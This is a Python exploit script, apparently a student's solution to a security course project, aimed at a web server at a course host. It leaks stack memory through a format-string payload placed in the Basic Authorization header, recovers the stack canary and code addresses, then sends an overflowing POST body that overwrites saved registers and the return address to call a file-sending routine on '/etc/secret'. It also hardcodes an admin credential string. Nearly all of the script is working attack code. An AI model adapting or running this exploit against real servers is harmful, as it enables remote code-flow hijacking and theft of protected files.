

url = "http://project-2.csec.chatzi.org:8000"
pas="admin:8c6e2f34df08e2f879e61eeb9e8ba96f8d9e96d8033870f80127567d270d7d96"


from requests import Request, Session
import base64
import time
import requests


last = None		#teleutaio
semi_last = None	#proteleutaio
canery = None #4o apo to telos
hellooo = None	#trito


def transform_address(address):

	mybytes= address.to_bytes(4, byteorder='little')
	mystring = ""
	for b in mybytes:
		if int(b) != 0:
			mystring += '%c' % int(b)
			print(int(b))
		else:
			mystring += '%c' % 0x26
			print(0x26)
	return mystring



def set_variables():
	global last
	global semi_last
	global canery
	global hellooo

	payl = "%p %d %p %p %p %p %s %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p:psswd"

	headers = {"Authorization":"Basic " + base64.b64encode(payl.encode("utf-8")).decode("utf-8")}
	response = requests.get(url,headers = headers)

	print(response.status_code)
	mystring = response.headers['WWW-Authenticate'][13:-1].split(' ')



	last = int(mystring[-1],16)
	semi_last = int(mystring[-2],16)
	canery = int(mystring[-4],16)
	hellooo = int(mystring[4],16)

set_variables()


guessed_address=last - 0xB8	#vale to teleutaio argument 
send_file = semi_last - 0x4f85 #vale to proteleutaio argument 
var_c0_value = canery	#vale to 4o apo to telos



old_ebp = last
old_esi = 0xF7F31000 #####dn paizei kapoio rolo
old_ebx = var_c0_value

#FFCD7398  FFCD73C8
#FFCD7394  F7FD9000
#FFCD7390  565FDF00

# ebp FFDB6398: FFDB63E8
# esi FFDB63B4:	F7F31000
# ebx FFDB63B0: 565A4F00


shutdown = hellooo - 0x1C7	#vres original return address of post_param
print("send_file difference with semi_last")
print(hex(semi_last - send_file))


#hmm 565A3AF8


print(hex(guessed_address))



shellcode = "/etc/secret&" 

data = shellcode 
data +=  80*"!" 
data += transform_address(guessed_address + 140 + 4)
data += 8*"!" + 4*"-" + 4*"-"+4*"!"
data += transform_address(guessed_address + 8)
data += 4*"-" 
data +=  transform_address(var_c0_value)
data += transform_address(old_ebx) 
data += transform_address(old_esi) 
data += transform_address(old_ebp) 
data +=  transform_address(send_file) 
data +=  transform_address(shutdown)
data += transform_address(guessed_address)
data += '\0'


s = Session()

req = Request('POST', url, data=data)

prepped = req.prepare()
prepped.headers['Content-Length'] = 66
prepped.headers['Authorization'] = "Basic " + base64.b64encode(pas.encode("utf-8")).decode("utf-8")
response = s.send(prepped)


print(response.status_code)
print(response.headers)
print(response.content)

